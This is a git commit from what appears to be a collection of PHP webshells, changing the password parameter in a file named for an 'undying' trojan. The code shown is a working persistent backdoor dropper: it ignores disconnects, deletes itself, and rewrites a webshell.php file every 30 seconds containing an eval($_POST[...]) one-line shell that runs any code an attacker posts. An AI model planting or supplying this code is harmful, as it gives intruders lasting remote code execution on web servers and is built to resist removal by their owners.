4cabada1404b4666f92f0f9e987c3236402f83b3
leticia <echo_hun@foxmail.com>
2018-05-08 21:55:20 +0800

    Update php不死马.php

--- 一句话木马/php不死马.php
+++ 一句话木马/php不死马.php
@@ -3,7 +3,7 @@
     ignore_user_abort(1);  
     unlink(__FILE__);  
     while(1){  
-        file_put_contents('webshell.php','<?php @eval($_POST["password"]);?>');  
+        file_put_contents('webshell.php','<?php @eval($_POST["leticia"]);?>');  
         sleep(30);  
     }
 ?>
